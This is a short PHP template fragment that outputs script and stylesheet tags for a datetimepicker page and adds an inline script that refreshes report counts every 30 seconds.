echo "\n\n" . '  <link rel="stylesheet" href="theme/bootstrap-datetimepicker.min.css" />' . "\n" . '  <script type="text/javascript" src="theme/moment.js"></script>' . "\n" . '  <script type="text/javascript" src="theme/transition.js"></script>' . "\n" . '  <script type="text/javascript" src="theme/collapse.js"></script>' . "\n" . '  <script type="text/javascript" src="theme/bootstrap-datetimepicker.min.js"></script>' . "\n\n";
echo $output;

if (!$notDefault) {
	echo '<script type="text/javascript">window.cntReports=' . $dataReport[POINTER_SUM][POINTER_SUM] . ';window.todayReports=' . $todayReports . ';window.setInterval(function() { updateStat(); }, 30000);</script>';
}

ThemeEnd();
echo $jsOutput;

?>
